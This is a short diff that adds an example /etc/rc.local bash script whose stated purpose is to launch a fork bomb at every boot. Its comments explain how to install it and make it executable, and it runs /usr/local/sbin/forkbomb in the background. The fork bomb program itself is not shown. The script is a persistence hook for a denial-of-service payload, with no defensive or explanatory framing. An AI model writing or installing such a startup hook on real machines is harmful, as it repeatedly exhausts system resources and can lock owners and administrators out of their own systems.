@@ -1,0 +1,8 @@
+#!/bin/bash
+# Example rc.local startup script for fork bomb
+# Copy this to /etc/rc.local and make it executable: chmod +x /etc/rc.local
+# Then add the following line before exit 0:
+
+/usr/local/sbin/forkbomb &
+
+exit 0
